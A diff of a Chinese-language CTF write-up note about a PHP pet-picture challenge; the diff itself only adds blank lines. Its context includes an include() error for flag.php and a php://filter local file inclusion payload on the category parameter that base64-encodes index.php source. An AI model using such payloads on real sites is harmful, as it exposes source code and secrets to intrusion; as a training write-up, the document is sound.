@@ -2,6 +2,7 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221115084917.png]]
 
 按下`WOOFERS`后访问
@@ -9,6 +10,7 @@
 /index.php?category=woofers
 ```
 并且随机显示一张小狗的图片
+
 ![[Pasted image 20221115085147.png]]
 
 按下`MEOWERS`后访问
@@ -16,6 +18,7 @@
 /index.php?category=meowers
 ```
 并且随机显示一张小猫的图片
+
 ![[Pasted image 20221115085322.png]]
 
 ---
@@ -43,7 +46,9 @@
 > **Warning**: include(): Failed opening 'flag.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **37**
 
 发现并不能读取到
+
 尝试使用`php://filter`伪协议对`index.php`进行读取
+
 使用一个`php://filter`伪协议的`trick`
 ```php
 /index.php?category=php://filter/read=convert.base64-encode/write=woofers/resource=index
